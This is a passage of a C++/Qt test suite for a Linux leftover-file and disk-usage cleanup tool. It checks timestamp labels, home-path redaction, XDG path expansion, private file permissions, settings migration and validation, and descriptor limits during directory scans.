            if (!part.open(QIODevice::WriteOnly) || part.write(QByteArray(4096, 'x')) != 4096) {
                std::fprintf(stderr, "leftover size: parallel write failed\n");
                return 1;
            }
            part.close();
            Finding row = sized;
            row.path = sub;
            row.name = QStringLiteral("gone-%1").arg(i);
            many << row;
        }
        enrichLeftoverSizes(many);
        for (int i = 0; i < many.size(); ++i) {
            if (many[i].bytes < 4096) {
                std::fprintf(stderr, "leftover size: parallel %d got %lld\n",
                    i, static_cast<long long>(many[i].bytes));
                return 1;
            }
        }
        const QDir homeCfg(QDir::home().filePath(QStringLiteral(".config")));
        QString liveName;
        const QStringList prefer = {
            QStringLiteral("atopile"),
            QStringLiteral("cachyos-hello.json"),
            QStringLiteral("cachyos"),
        };
        for (const QString &n : prefer) {
            if (QFileInfo::exists(homeCfg.filePath(n))) {
                liveName = n;
                break;
            }
        }
        if (liveName.isEmpty()) {
            const QStringList files = homeCfg.entryList(QDir::Files);
            if (!files.isEmpty()) liveName = files.first();
        }
        if (homeCfg.exists() && !liveName.isEmpty()) {
            QJsonObject finding;
            finding.insert(QStringLiteral("kind"), QStringLiteral("orphan-dir"));
            finding.insert(QStringLiteral("name"), liveName);
            finding.insert(QStringLiteral("path"),
                QStringLiteral("/home/user/.config/") + liveName);
            finding.insert(QStringLiteral("status"), QStringLiteral("orphaned"));
            QJsonObject blob;
            blob.insert(QStringLiteral("plugin"), QStringLiteral("path-xdg-config"));
            blob.insert(QStringLiteral("findings"), QJsonArray{finding});
            QVector<Finding> live;
            appendFindingsFromBlob(live, QJsonDocument(blob).toJson(QJsonDocument::Compact));
            if (live.size() != 1) {
                std::fprintf(stderr, "leftover size: live leftover JSON ingest\n");
                return 1;
            }
            if (QDir::homePath() != QLatin1String("/home/user")
                && live[0].path.contains(QLatin1String("/home/user/"))) {
                std::fprintf(stderr, "leftover size: /home/user path not expanded (%s)\n",
                    live[0].path.toUtf8().constData());
                return 1;
            }
            if (!QFileInfo::exists(live[0].path)) {
                std::fprintf(stderr, "leftover size: expanded live path missing (%s)\n",
                    live[0].path.toUtf8().constData());
                return 1;
            }
            enrichLeftoverSizes(live);
            if (live[0].bytes < 0) {
                std::fprintf(stderr, "leftover size: live leftover still unknown (%s)\n",
                    live[0].path.toUtf8().constData());
                return 1;
            }
        }
    }
    Finding owned;
    owned.plugin = QStringLiteral("path-xdg-config");
    owned.status = QStringLiteral("keep");
    owned.kind = QStringLiteral("orphan-dir");
    owned.name = QStringLiteral("firefox");
    if (matchPage(owned, Page::Leftovers)) {
        std::fprintf(stderr, "leftovers: keep/owned leftover must not list on Leftovers\n");
        return 1;
    }
    return 0;
}

static int checkTiming() {
    const QDateTime z = parseIsoInstant(QStringLiteral("2026-08-17T12:30:00Z"));
    const QDateTime offset = parseIsoInstant(QStringLiteral("2026-08-17T12:30:00+00:00"));
    if (!z.isValid() || !offset.isValid()
        || qAbs(z.toUTC().toSecsSinceEpoch() - offset.toUTC().toSecsSinceEpoch()) > 0) {
        std::fprintf(stderr, "timing: Z and +00:00 must be the same instant\n");
        return 1;
    }
    const QDateTime naive = parseIsoInstant(QStringLiteral("2026-04-01T15:00:00"));
    const QDateTime naiveZ = parseIsoInstant(QStringLiteral("2026-04-01T15:00:00Z"));
    if (!naive.isValid() || naive.toUTC().toSecsSinceEpoch() != naiveZ.toUTC().toSecsSinceEpoch()) {
        std::fprintf(stderr, "timing: timezone-less ISO must be UTC\n");
        return 1;
    }
    const QDateTime micro = parseIsoInstant(QStringLiteral("2026-04-01T15:00:00.123456Z"));
    if (!micro.isValid()
        || qAbs(micro.toMSecsSinceEpoch() - naiveZ.toMSecsSinceEpoch() - 123) > 1) {
        std::fprintf(stderr, "timing: XBEL microseconds truncated to millis\n");
        return 1;
    }

    Finding idle;
    idle.idleDays = 120;
    if (modifiedLabel(idle) != localeCount(120) + QLatin1String(" days ago")) {
        std::fprintf(stderr, "timing: idleDays label\n");
        return 1;
    }
    Finding today;
    today.mtime = QDateTime::currentDateTimeUtc().toString(Qt::ISODate);
    if (modifiedLabel(today) != QLatin1String("Today")) {
        std::fprintf(stderr, "timing: current UTC mtime should be Today (%s)\n",
            modifiedLabel(today).toUtf8().constData());
        return 1;
    }

    const QTimeZone ny(QByteArray("America/New_York"));
    if (ny.isValid()) {
        // 2026-03-08 04:30 UTC is 2026-03-07 23:30 EST (spring-forward is 07:00 UTC).
        const QDateTime utc = parseIsoInstant(QStringLiteral("2026-03-08T04:30:00Z"));
        if (!utc.isValid() || utc.toTimeZone(ny).date() != QDate(2026, 3, 7)) {
            std::fprintf(stderr, "timing: UTC instant must be previous local day in New York\n");
            return 1;
        }
        Finding crossed;
        crossed.mtime = QStringLiteral("2026-03-08T04:30:00Z");
        const QDateTime nyNow(QDate(2026, 9, 2), QTime(12, 0), ny);
        // Beyond the relative window the label is the local date in the user's
        // own date format, so compare against that format.
        const QString nyExpected = localeDateLabel(QDate(2026, 3, 7));
        if (modifiedLabel(crossed, nyNow) != nyExpected) {
            std::fprintf(stderr,
                "timing: UTC prefix must not win over local date (%s, want %s)\n",
                modifiedLabel(crossed, nyNow).toUtf8().constData(),
                nyExpected.toUtf8().constData());
            return 1;
        }
        Finding future;
        future.mtime = QStringLiteral("2026-09-04T12:00:00Z");
        const QDateTime nyNow2(QDate(2026, 9, 2), QTime(12, 0), ny);
        const QString futureExpected = localeDateLabel(parseIsoInstant(future.mtime).toTimeZone(ny).date());
        if (modifiedLabel(future, nyNow2) != futureExpected) {
            std::fprintf(stderr,
                "timing: a future mtime must show its local date (%s, want %s)\n",
                modifiedLabel(future, nyNow2).toUtf8().constData(),
                futureExpected.toUtf8().constData());
            return 1;
        }
        const QDateTime saturday(QDate(2026, 3, 7), QTime(23, 30), ny);
        const QDateTime sunday(QDate(2026, 3, 8), QTime(22, 30), ny);
        if (saturday.secsTo(sunday) >= 86400) {
            std::fprintf(stderr, "timing: expected spring-forward elapsed < 24h\n");
            return 1;
        }
        if (saturday.toTimeZone(ny).date().daysTo(sunday.toTimeZone(ny).date()) != 1) {
            std::fprintf(stderr, "timing: spring-forward must still be one local calendar day\n");
            return 1;
        }
        const QDateTime morning(QDate(2026, 11, 1), QTime(0, 0), ny);
        const QDateTime evening(QDate(2026, 11, 1), QTime(23, 30), ny);
        if (morning.secsTo(evening) <= 86400) {
            std::fprintf(stderr, "timing: expected fall-back elapsed > 24h\n");
            return 1;
        }
        if (morning.toTimeZone(ny).date().daysTo(evening.toTimeZone(ny).date()) != 0) {
            std::fprintf(stderr, "timing: fall-back same local day must stay today\n");
            return 1;
        }
    }

    Finding dateOnly;
    dateOnly.mtime = QStringLiteral("2026-08-17");
    const QString dateLabel = modifiedLabel(dateOnly);
    if (dateLabel == QLatin1String("unknown")) {
        std::fprintf(stderr, "timing: date-only mtime must parse\n");
        return 1;
    }

    std::fprintf(stdout, "timing: ok\n");
    return 0;
}

static int checkPrivacy() {
    const QString home = QStringLiteral("/home/alice");
    const QString redacted = redactHomePaths(
        QStringLiteral("rm: cannot remove '/home/alice/Library/Caches/Foo': Permission denied"),
        home);
    if (redacted.contains(QLatin1String("/home/alice"))) {
        std::fprintf(stderr, "redact: home path remains (%s)\n", redacted.toUtf8().constData());
        return 1;
    }
    if (!redacted.contains(QLatin1String("~/Library/Caches/Foo"))) {
        std::fprintf(stderr, "redact: expected tilde path (%s)\n", redacted.toUtf8().constData());
        return 1;
    }
    const QString neighbor = redactHomePaths(QStringLiteral("/home/alice2/secret"), home);
    if (!neighbor.contains(QLatin1String("/home/alice2"))) {
        std::fprintf(stderr, "redact: over-redacted neighbor home\n");
        return 1;
    }
    // The XDG roots take precedence over the home fallback, so the home-only
    // expectations below are pinned to an unset environment rather than to
    // whatever the test machine exports.
    const QByteArray savedXdgConfig = qgetenv("XDG_CONFIG_HOME");
    const QByteArray savedXdgData = qgetenv("XDG_DATA_HOME");
    const auto restoreXdg = [&] {
        for (const auto &pair : {qMakePair("XDG_CONFIG_HOME", savedXdgConfig),
                                 qMakePair("XDG_DATA_HOME", savedXdgData)}) {
            if (pair.second.isEmpty()) {
                qunsetenv(pair.first);
            } else {
                qputenv(pair.first, pair.second);
            }
        }
    };
    qunsetenv("XDG_CONFIG_HOME");
    qunsetenv("XDG_DATA_HOME");
    bool expandOk =
        expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/home/alice/.config/gone-app")
        && expandHomeUserPlaceholder(QStringLiteral("rm -rf /home/user/.config/gone-app"), home)
            == QStringLiteral("rm -rf /home/alice/.config/gone-app");
    // A configured root is the directory the core scanned, so that is the path
    // a finding has to name, at the root and below it alike.
    qputenv("XDG_CONFIG_HOME", "/srv/u/config");
    qputenv("XDG_DATA_HOME", "/srv/u/data");
    expandOk = expandOk
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/srv/u/config/gone-app")
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.local/share/applications/foo.desktop"), home)
            == QStringLiteral("/srv/u/data/applications/foo.desktop");
    // A relative value is ignored, so the default root stands.
    qputenv("XDG_CONFIG_HOME", "relative/config");
    expandOk = expandOk
        && expandHomeUserPlaceholder(QStringLiteral("/home/user/.config/gone-app"), home)
            == QStringLiteral("/home/alice/.config/gone-app");
    restoreXdg();
    if (!expandOk) {
        std::fprintf(stderr, "expand: /home/user and XDG root expansion\n");
        return 1;
    }
    if (expandHomeUserPlaceholder(QStringLiteral("/home/username/foo"), home)
        != QStringLiteral("/home/username/foo")) {
        std::fprintf(stderr, "expand: over-replaced username\n");
        return 1;
    }
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "redact: temp dir failed\n");
        return 1;
    }
    const QString dir = tmp.filePath(QStringLiteral("appattic"));
    if (!QDir().mkpath(dir)) {
        std::fprintf(stderr, "redact: mkpath failed\n");
        return 1;
    }
    const QString path = dir + QStringLiteral("/settings.json");
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly) || f.write("{}") != 2) {
        std::fprintf(stderr, "redact: write failed\n");
        return 1;
    }
    f.close();
    restrictPrivateDataFile(path);
    const QFile::Permissions filePerms = QFileInfo(path).permissions();
    const QFile::Permissions dirPerms = QFileInfo(dir).permissions();
    if (filePerms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
            | QFileDevice::WriteGroup | QFileDevice::WriteOther)) {
        std::fprintf(stderr, "redact: settings file is group/other readable\n");
        return 1;
    }
    if (dirPerms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
            | QFileDevice::ExeGroup | QFileDevice::ExeOther)) {
        std::fprintf(stderr, "redact: appattic dir is group/other accessible\n");
        return 1;
    }
    std::fprintf(stdout, "redact: ok\n");
    return 0;
}

/// The legacy QSettings file holds the ignore list, which is absolute paths
/// under the account's own home, and QSettings wrote it readable by group and
/// other. The migration is the only code that knows which file that is, so
/// the mode is asserted there, and so is the removal that follows it: once the
/// values are in settings.json the old file is a second copy of those paths
/// that nothing opens. The QSettings path is pointed at a temp dir first:
/// the default one is the real ~/.config, which the test must not read or
/// rewrite.
static int checkLegacySettingsMigration() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "legacy: temp dir failed\n");
        return 1;
    }
    const QSettings::Format savedFormat = QSettings::defaultFormat();
    QSettings::setDefaultFormat(QSettings::IniFormat);
    QSettings::setPath(QSettings::IniFormat, QSettings::UserScope, tmp.path());
    const QStringList ignored{QStringLiteral("/home/alice/.config/gone-app")};
    const QString legacyPath = [&] {
        QSettings qs(QStringLiteral("AppAttic"), QStringLiteral("AppAttic"));
        qs.setValue(QStringLiteral("confirmDelete"), true);
        qs.setValue(QStringLiteral("ignoredLeftovers"), ignored);
        qs.sync();
        return QFileInfo(qs.fileName()).absoluteFilePath();
    }();
    if (!QFile::setPermissions(
            legacyPath,
            QFileDevice::ReadOwner | QFileDevice::WriteOwner
                | QFileDevice::ReadGroup | QFileDevice::ReadOther)) {
        std::fprintf(stderr, "legacy: could not widen the fixture mode\n");
        QSettings::setDefaultFormat(savedFormat);
        return 1;
    }
    bool hadValues = false;
    QStringList unreadable;
    QString reportedPath;
    const AppSettings s = migrateLegacyQSettings(&hadValues, &unreadable, &reportedPath);
    const QFile::Permissions perms = QFileInfo(legacyPath).permissions();
    const bool worldReadable = perms & (QFileDevice::ReadGroup | QFileDevice::ReadOther
        | QFileDevice::WriteGroup | QFileDevice::WriteOther);
    const int rc = !hadValues || !unreadable.isEmpty() || s.ignoredLeftoverPaths != ignored
            || !s.confirmDelete || reportedPath != legacyPath || worldReadable
        ? 1
        : 0;
    // The removal is the caller's move after the values are written, so it is
    // checked here as its own step: the file is gone, and a second call on a
    // file that is not there is the wanted state rather than a failure.
    const bool removed = rc == 0 && removeLegacySettingsFile(reportedPath)
        && !QFile::exists(legacyPath) && removeLegacySettingsFile(reportedPath);
    QSettings::setDefaultFormat(savedFormat);
    if (rc != 0) {
        std::fprintf(stderr,
            "legacy: migration did not carry the values and narrow the file "
            "(had=%d unreadable=%lld paths=%lld mode=%o)\n",
            hadValues ? 1 : 0, static_cast<long long>(unreadable.size()),
            static_cast<long long>(s.ignoredLeftoverPaths.size()),
            static_cast<unsigned>(perms & QFileDevice::ReadGroup ? 0040 : 0)
                | static_cast<unsigned>(perms & QFileDevice::ReadOther ? 0004 : 0));
        return rc;
    }
    if (!removed) {
        std::fprintf(stderr, "legacy: the migrated file was not removed\n");
        return 1;
    }
    std::fprintf(stdout, "legacy: ok\n");
    return 0;
}

static int writeFile(const QString &path, const QByteArray &body) {
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly | QIODevice::Truncate)) return 1;
    if (f.write(body) != body.size()) return 1;
    return 0;
}

/// Open descriptors in this process, from /proc. -1 where that is unavailable,
/// so a non-Linux run skips the bound instead of failing it.
static int openDescriptorCount() {
    QDir d(QStringLiteral("/proc/self/fd"));
    if (!d.exists()) return -1;
    return int(d.entryList(QDir::AllEntries | QDir::System | QDir::NoDotAndDotDot).size());
}

namespace {

struct FdProbe {
    QAtomicInt peak{0};
};

/// Sampled at the end of every directory's walk: the root's fires last on the
/// first thread, which is the moment the whole deferral is outstanding.
void noteDescriptors(const DiskNode &, void *user) {
    auto *probe = static_cast<FdProbe *>(user);
    const int n = openDescriptorCount();
    int seen = probe->peak.loadAcquire();
    while (n > seen && !probe->peak.testAndSetAcquire(seen, n)) {
        seen = probe->peak.loadAcquire();
    }
}

} // namespace

/// A wide tree must not sit on one descriptor per directory it defers: the
/// deferred fds are all live until the worker phase starts, so an uncapped
/// deferral holds hundreds at once on a home folder and runs into the process
/// limit. The walk still has to produce every directory and the same totals.
static int checkDeferredFdBound() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "fd bound: temp dir failed\n");
        return 1;
    }
    const QString root = tmp.path();
    const int dirCount = 400;
    for (int i = 0; i < dirCount; ++i) {
        const QString sub = QStringLiteral("%1/d%2").arg(root).arg(i);
        if (!QDir().mkpath(sub)) {
            std::fprintf(stderr, "fd bound: mkpath %d failed\n", i);
            return 1;
        }
        if (writeFile(sub + QStringLiteral("/f.bin"), QByteArray(4096, 'x'))) {
            std::fprintf(stderr, "fd bound: write %d failed\n", i);
            return 1;
        }
    }
    const int before = openDescriptorCount();
    if (before < 0) {
        std::fprintf(stdout, "fd bound: no /proc/self/fd, skipped\n");
        return 0;
    }
    FdProbe probe;
    DiskScanOptions opts;
    opts.oneFileSystem = true;
    opts.dirDone = &noteDescriptors;
    opts.user = &probe;
    DiskNode *tree = scanDiskTree(root, opts);
    if (!tree || tree->unreadable) {
        std::fprintf(stderr, "fd bound: scan produced no tree\n");
        delete tree;
        return 1;
    }
    if (tree->children.size() != dirCount) {
        std::fprintf(stderr, "fd bound: got %lld children, want %d\n",
            static_cast<long long>(tree->children.size()), dirCount);
        delete tree;
        return 1;
    }
    qint64 perDir = 0;
    for (const DiskNode *c : tree->children) {
        if (!c->isDir) continue;
        perDir += c->apparent;
    }
    if (perDir < qint64(dirCount) * 4096) {
        std::fprintf(stderr, "fd bound: deferred totals lost (%lld of %lld)\n",
            static_cast<long long>(perDir), static_cast<long long>(dirCount) * 4096);
        delete tree;
        return 1;
    }
    delete tree;
    /* The deferred pool (kMaxDeferredDirFds), the workers walking at the same
       time, and the descriptors the test already held. An uncapped deferral
       reaches one per directory instead, which is what this pins. */
    const int slack = before + 64 + 8 + 16;
    if (probe.peak.loadAcquire() > slack) {
        std::fprintf(stderr, "fd bound: %d descriptors open mid-walk, limit %d\n",
            probe.peak.loadAcquire(), slack);
        return 1;
    }
    std::fprintf(stdout, "fd bound: ok (peak %d, limit %d)\n", probe.peak.loadAcquire(), slack);
    return 0;
}

static int checkDiskTreeCollation() {
    // Rows of one size are ordered by name, and a German or Swedish reader
    // expects dictionary order: code units put "Zebra" ahead of "apple" and
    // "Äpfel" behind every ASCII name. The default locale is what `QLocale()`
    // and so `sortChildren` reads, so setting it here is what a German window
    // would see.
    const QLocale saved = QLocale();
    QLocale::setDefault(QLocale(QLocale::German, QLocale::Germany));
    DiskNode root;
    const char *names[] = {"Zebra", "Äpfel", "apple"};
    for (const char *name : names) {
        auto *child = new DiskNode;
        child->name = QString::fromUtf8(name);
        child->path = QStringLiteral("/tmp/") + child->name;
        child->apparent = 10;
        child->allocated = 10;
        root.children.append(child);
    }
    root.sortChildren(false);
    QStringList order;
    for (const DiskNode *c : root.children) order.append(c->name);
    QLocale::setDefault(saved);
    if (order != QStringList({QString::fromUtf8("Äpfel"), QStringLiteral("apple"),
                              QStringLiteral("Zebra")})) {
        std::fprintf(stderr, "disk: German tree order is %s\n",
            qPrintable(order.join(QLatin1Char(','))));
        return 1;
    }
    return 0;
}

static int checkDiskUsage() {
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "disk: temp dir failed\n");
        return 1;
    }
    const QString root = tmp.path();
    const QString sub = root + QStringLiteral("/big");
    if (!QDir().mkpath(sub)) {
        std::fprintf(stderr, "disk: mkpath failed\n");
        return 1;
    }
    const QByteArray payload(4096, 'x');
    if (writeFile(sub + QStringLiteral("/a.bin"), payload)
        || writeFile(root + QStringLiteral("/small.txt"), QByteArray("hi\n"))) {
        std::fprintf(stderr, "disk: write failed\n");
        return 1;
    }
    const QString linkDir = root + QStringLiteral("/linkdir");
    if (!QFile::link(sub, linkDir)) {
        std::fprintf(stderr, "disk: symlink failed\n");
        return 1;
    }

    DiskScanOptions opts;
    opts.oneFileSystem = true;
    DiskNode *tree = scanDiskTree(root, opts);
    if (!tree || tree->unreadable || tree->children.size() < 2) {
        std::fprintf(stderr, "disk: scan produced no children\n");
        delete tree;
        return 1;
    }
    const DiskNode *big = nullptr;
    const DiskNode *small = nullptr;
    const DiskNode *link = nullptr;
    for (const DiskNode *c : tree->children) {
        if (c->name == QLatin1String("big")) big = c;
        if (c->name == QLatin1String("small.txt")) small = c;
        if (c->name == QLatin1String("linkdir")) link = c;
    }
    if (!big || !big->isDir || big->apparent < 4096) {
        std::fprintf(stderr, "disk: big dir apparent size missing\n");
        delete tree;
        return 1;
    }
    if (!small || small->isDir || small->apparent < 3) {
        std::fprintf(stderr, "disk: small file missing\n");
        delete tree;
        return 1;
    }
    if (measurePathBytes(sub) < 4096) {
        std::fprintf(stderr, "disk: measurePathBytes missed the 4096-byte file\n");
        delete tree;
        return 1;
    }
    if (!link || link->isDir) {
        std::fprintf(stderr, "disk: directory symlink was followed\n");
        delete tree;
        return 1;
    }
    if (tree->apparent < big->apparent || tree->items < 3) {
        std::fprintf(stderr, "disk: root totals too small\n");
        delete tree;
        return 1;
    }
    tree->sortChildren(false);
    if (tree->children.isEmpty() || tree->children[0]->name != QLatin1String("big")) {
        std::fprintf(stderr, "disk: sort by apparent did not put big first\n");
        delete tree;
        return 1;
    }
    delete tree;
    tree = nullptr;

    const QString many = root + QStringLiteral("/many");
    if (!QDir().mkpath(many)) {
        std::fprintf(stderr, "disk: many mkpath failed\n");
        return 1;
    }
    for (int i = 0; i < 200; ++i) {
        const QString n = QStringLiteral("%1/f%2.txt").arg(many).arg(i);
        if (writeFile(n, QByteArray("x\n"))) {
            std::fprintf(stderr, "disk: many write failed\n");
            return 1;
        }
    }
    tree = scanDiskTree(root, opts);
    if (!tree || tree->unreadable) {
        std::fprintf(stderr, "disk: rescan after many files failed\n");
        delete tree;
        return 1;
    }
    const DiskNode *manyNode = nullptr;
    for (const DiskNode *c : tree->children) {
        if (c->name == QLatin1String("many")) manyNode = c;
    }
    if (!manyNode || !manyNode->isDir || manyNode->children.size() < 200) {
        std::fprintf(stderr, "disk: getdents listing missed files (%d)\n",
            manyNode ? int(manyNode->children.size()) : -1);
        delete tree;
        return 1;
    }
    const QString linkRoot = root + QStringLiteral("/rootlink");
    if (!QFile::link(sub, linkRoot)) {
        std::fprintf(stderr, "disk: root symlink failed\n");
        delete tree;
        return 1;
    }
    delete tree;
    tree = scanDiskTree(linkRoot, opts);
    if (!tree || tree->unreadable || tree->children.isEmpty()) {
        std::fprintf(stderr, "disk: scan of directory symlink root failed\n");
        delete tree;
        return 1;
    }
    bool sawBin = false;
    for (const DiskNode *c : tree->children) {
        if (c->name == QLatin1String("a.bin")) sawBin = true;
    }
    if (!sawBin) {
        std::fprintf(stderr, "disk: symlink root did not follow to contents\n");
        delete tree;
        return 1;
    }
    delete tree;

    const QVector<DiskVolume> vols = listDiskVolumes();
    bool hasRoot = false;
    for (const DiskVolume &v : vols) {
        if (v.isRoot && v.bytesTotal > 0) hasRoot = true;
        // "/" + "/" is "//", so the root volume only counts as home if the
        // comparison special-cases it.
        if (v.isRoot && !v.isHome) {
            std::fprintf(stderr, "disk: root volume not marked isHome\n");
            return 1;
        }
        if (v.rootPath == QLatin1String("/proc")) {
            std::fprintf(stderr, "disk: listed virtual /proc\n");
            return 1;
        }
        if (v.fileSystem.toLower() == QLatin1String("tmpfs")
            && v.rootPath != QLatin1String("/")
            && !v.isHome) {
            std::fprintf(stderr, "disk: listed tmpfs %s\n", v.rootPath.toUtf8().constData());
            return 1;
        }
        if (v.rootPath == QLatin1String("/run")
            || v.rootPath.startsWith(QLatin1String("/run/"))) {
            std::fprintf(stderr, "disk: listed /run mount %s\n", v.rootPath.toUtf8().constData());
            return 1;
        }
    }
    if (!hasRoot) {
        std::fprintf(stderr, "disk: file system volume missing\n");
        return 1;
    }
    if (diskContentsLabel(1, true) != QLatin1String("Empty")) {
        std::fprintf(stderr, "disk: empty contents label\n");
        return 1;
    }
    if (diskContentsLabel(5, true) != localeCount(4) + QLatin1String(" items")) {
        std::fprintf(stderr, "disk: items label\n");
        return 1;
    }
    const int collation = checkDiskTreeCollation();
    if (collation != 0) return collation;
    std::fprintf(stdout, "disk: ok\n");
    return 0;
}

static int checkScanCache() {
    /* The path has to be the one the CLI and the macOS UI write, or dropping
       it here leaves their snapshot in place. */
    const QString path = scanCacheFilePath();
    if (!path.endsWith(QLatin1String("appattic/last-scan.json"))) {
        std::fprintf(stderr, "scan cache: unexpected path (%s)\n", qPrintable(path));
        return 1;
    }
    if (QFileInfo(path).dir() != QFileInfo(settingsFilePath()).dir()) {
        std::fprintf(stderr, "scan cache: not beside the settings file\n");
        return 1;
    }
    QTemporaryDir tmp;
    if (!tmp.isValid()) {
        std::fprintf(stderr, "scan cache: temp dir failed\n");
        return 1;
    }
    const QString file = tmp.filePath(QStringLiteral("last-scan.json"));
    /* A snapshot that is not there is the state a cleanup wants, so removing
       one that was never written cannot report failure. */
    if (!removeScanCacheFile(file)) {
        std::fprintf(stderr, "scan cache: removing a missing file failed\n");
        return 1;
    }
    if (writeFile(file, QByteArray("{}"))) {
        std::fprintf(stderr, "scan cache: write failed\n");
        return 1;
    }
    if (!removeScanCacheFile(file) || QFile::exists(file)) {
        std::fprintf(stderr, "scan cache: file survived removal\n");
        return 1;
    }
    std::fprintf(stdout, "scan cache: ok\n");
    return 0;
}

static int checkSettings() {
    // A legacy value that is not a boolean must not become the default: the
    // migration would write that default back as the user's setting.
    bool readable = false;
    if (!legacyBoolValue(QVariant(true), false, &readable) || !readable) {
        std::fprintf(stderr, "settings: legacy bool QVariant(true)\n");
        return 1;
    }
    for (const char *on : {"true", "1", "yes", "YES", " true "}) {
        if (!legacyBoolValue(QVariant(QString::fromLatin1(on)), false, &readable) || !readable) {
            std::fprintf(stderr, "settings: legacy bool on spelling %s\n", on);
            return 1;
        }
    }
    for (const char *off : {"false", "0", "no", "No"}) {
        if (legacyBoolValue(QVariant(QString::fromLatin1(off)), true, &readable) || !readable) {
            std::fprintf(stderr, "settings: legacy bool off spelling %s\n", off);
            return 1;
        }
    }
    // The `!` this line used to carry made it ask the opposite question: an
    // unreadable value that returned its fallback, which is the contract, read
    // as a failure, so the check failed on correct behaviour.
    if (legacyBoolValue(QVariant(QStringLiteral("maybe")), true, &readable) != true
        || legacyBoolValue(QVariant(QStringLiteral("maybe")), false, &readable) != false
        || readable) {
        std::fprintf(stderr, "settings: unreadable legacy value was not reported\n");
        return 1;
    }

    AppSettings s;
    QString err;
    const QByteArray raw = R"({"confirmDelete":false,"ignoredLeftoverPaths":["/a","/a"],"includeSystem":true})";
    if (!parseSettingsJson(raw, &s, &err) || s.confirmDelete || !s.includeSystem
        || s.ignoredLeftoverPaths != QStringList{QStringLiteral("/a")}) {
        std::fprintf(stderr, "settings: valid settings.json not parsed (%s)\n", qPrintable(err));
        return 1;
    }
    for (const QByteArray &bad : {
             QByteArray(""),
             QByteArray("not json"),
             QByteArray("[]"),
             QByteArray(R"({"confirmDelete":"no"})"),
             QByteArray(R"({"unknownKey":true})"),
             QByteArray(R"({"ignoredLeftoverPaths":[1]})"),
             // A relative or `~` entry matches no reported leftover path, so it
             // hides nothing. The Swift loader refuses it; so does this one.
             QByteArray(R"({"ignoredLeftoverPaths":["~/.cache/Whisky"]})"),
             QByteArray(R"({"ignoredLeftoverPaths":["Whisky"]})"),
             // A trailing slash is the same entry spelled differently, so it
             // matches no reported path either. The Swift loader refuses it.
             QByteArray(R"({"ignoredLeftoverPaths":["/home/u/.cache/Whisky/"]})"),
         }) {
        if (parseSettingsJson(bad, &s, &err)) {
            std::fprintf(stderr, "settings: bad settings.json accepted: %s\n", bad.constData());
            return 1;
        }
    }
    std::fprintf(stdout, "settings: ok\n");
    return 0;
}

int main() {
    const int checks[] = {
        verifyHelpers(), checkPrivacy(), checkTiming(), checkDeferredFdBound(),
        checkDiskUsage(), checkScanCache(), checkSettings(),
        checkLegacySettingsMigration(),
    };
    for (const int rc : checks) {
        if (rc != 0) return rc;
    }
    std::fprintf(stdout, "helpers: ok\n");
    return 0;
}
